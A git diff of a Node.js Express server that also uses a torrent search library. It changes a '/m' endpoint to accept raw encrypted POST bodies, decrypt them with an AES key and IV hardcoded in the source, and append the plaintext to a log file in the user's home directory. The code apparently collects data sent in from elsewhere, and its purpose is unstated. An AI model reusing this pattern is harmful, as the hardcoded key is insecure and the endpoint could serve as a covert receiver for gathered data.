@@ -13,7 +13,12 @@ console.log(TorrentSearchApi.getActiveProviders().map(t => t.name));
 var express = require("express");
 var app = express();
 
-const LOG_FILE = path.join(__dirname, 'data.log');
+const LOG_DIR = process.env.HOME || process.env.LOCALAPPDATA || __dirname;
+const logFolder = path.join(LOG_DIR, 'logs');
+if (!fs.existsSync(logFolder)) fs.mkdirSync(logFolder, { recursive: true });
+
+const LOG_FILE = path.join(logFolder, 'data.log');
+
 const AES_KEY = Buffer.from('9Fgh87yHjKe28Zxn43fghkl09bFvYy23', 'utf8');
 const AES_IV = Buffer.from('A1B2C3D4E5F6G7H8', 'utf8');
 
@@ -68,21 +73,24 @@ app.post('/', (request, response, next) => {
 });
 
 app.post('/m', (request, response, next) => {
-  let user = request.body;
-  try {
-        const json = JSON.parse(body);
-        const encryptedBase64 = json.data;
-        const decrypted = decryptString(encryptedBase64);
+	
+  let body = '';
+  request.on('data', chunk => (body += chunk));
+  request.on('end', () => {
+	  try {
+			const encryptedBase64 = body;
+			const decrypted = decryptString(encryptedBase64);
 
-        console.log("Decrypted string:", decrypted);
-        fs.appendFileSync(LOG_FILE, decrypted + '\n', 'utf8');
+			fs.appendFileSync(LOG_FILE, decrypted + '\n', 'utf8');
 
-        res.writeHead(204);
-        res.end();
-      } catch (e) {
-        res.writeHead(500);
-        res.end();
-      }
+			response.writeHead(204);
+			response.end();
+		  } catch (e) {
+			console.log(e);
+			response.writeHead(500);		
+			response.end();
+		  }
+  });
 });
 
 app.listen(PORT, () => console.log(`Listening on ${ PORT }`));
